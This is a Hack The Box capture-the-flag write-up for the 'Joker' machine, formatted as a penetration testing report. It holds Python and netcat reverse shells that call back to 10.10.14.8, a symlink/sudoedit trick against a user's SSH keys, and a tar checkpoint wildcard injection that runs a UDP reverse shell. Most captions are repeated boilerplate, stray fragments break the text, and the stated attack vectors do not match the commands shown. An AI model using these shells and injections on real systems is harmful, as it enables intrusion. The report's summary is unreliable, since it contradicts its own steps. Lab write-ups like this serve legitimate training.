---
title: "OffSec Assessment: Joker (Hack The Box) — Penetration Testing Report"
published: true
description: "Comprehensive offensive security assessment and penetration testing report for Joker (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
tags: cybersecurity, hackthebox, pentesting, infosec
series: "HackTheBox Enterprise Assessments"
cover_image: "https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_01.png"
---

# Offensive Security Assessment Report: Joker

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Joker** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Tomcat/Struts OGNL RCE / Manager WAR
* **Privilege Escalation Vector:** Escalada vía backups/cron de backups mal configurado (lectura/escritura de ficheros de copia de seguridad) → root
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | Joker |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty Rating** | Hard |
| **Associated CVE(s)** | N/A |
| **Initial Foothold Vector** | Tomcat/Struts OGNL RCE / Manager WAR |
| **Privilege Escalation Vector** | Escalada vía backups/cron de backups mal configurado (lectura/escritura de ficheros de copia de seguridad) → root |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Tomcat/Struts OGNL RCE / Manager WAR
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: Escalada vía backups/cron de backups mal configurado (lectura/escritura de ficheros de copia de seguridad) → root
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

![step_01.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.



![step_02.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.



![step_03.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_04.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_05.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_05.png)
* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_06.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_06.png)
* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_07.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_07.png)
* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_08.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_08.png)
* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_09.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_09.png)
* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_10.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_10.png)
* **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx
import pty, os, socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.8", 9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```


![step_11.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_11.png)
* **Assessment Step 11:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_12.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_12.png)
* **Assessment Step 12:** Command execution output, exploit delivery proof, or auxiliary evidence.


O 

```jsx
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.8 9001 -u >/tmp/f &")
```


![step_13.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_13.png)
* **Assessment Step 13:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx
ln -s /home/alekos/.ssh/authorized_keys layout.html
```

´


![step_14.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_14.png)
* **Assessment Step 14:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx
**sudoedit -u alekos /var/www/testing/test/layout.html**
```


![step_15.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_15.png)
* **Assessment Step 15:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_16.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_16.png)
* **Assessment Step 16:** Command execution output, exploit delivery proof, or auxiliary evidence.


9c7c9df2d192f52dacd0c874c8094a6b


![step_17.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_17.png)
* **Assessment Step 17:** Command execution output, exploit delivery proof, or auxiliary evidence.


Escalada 


![step_18.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_18.png)
* **Assessment Step 18:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_19.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_19.png)
* **Assessment Step 19:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_20.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_20.png)
* **Assessment Step 20:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_21.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_21.png)
* **Assessment Step 21:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_22.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_22.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.


```jsx
alekos@joker:~/development$ cat > udp.sh << 'SH'
> #!/bin/sh
> LHOST="10.10.14.8"
> LPORT="9002"
> 
> if command -v socat >/dev/null 2>&1; then
>   exec socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane udp:${LHOST}:${LPORT}
> else
>   # Fallback sin socat: puede ser poco interactivo
>   /bin/bash -c "bash -i >& /dev/udp/${LHOST}/${LPORT} 0>&1"
> fi
> SH
alekos@joker:~/development$ chmod +x udp.sh
alekos@joker:~/development$ rm -f -- --checkpoint=1 -- '--checkpoint-action=exec=sh udp.sh'
alekos@joker:~/development$ touch -- --checkpoint=1
alekos@joker:~/development$ touch -- '--checkpoint-action=exec=sh udp.sh'
alekos@joker:~/development$ 
alekos@joker:~/development$ 

```

cat /root/root.txt


![step_23.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/joker/images/step_23.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Tomcat/Struts OGNL RCE / Manager WAR) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Escalada vía backups/cron de backups mal configurado (lectura/escritura de ficheros de copia de seguridad) → root) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
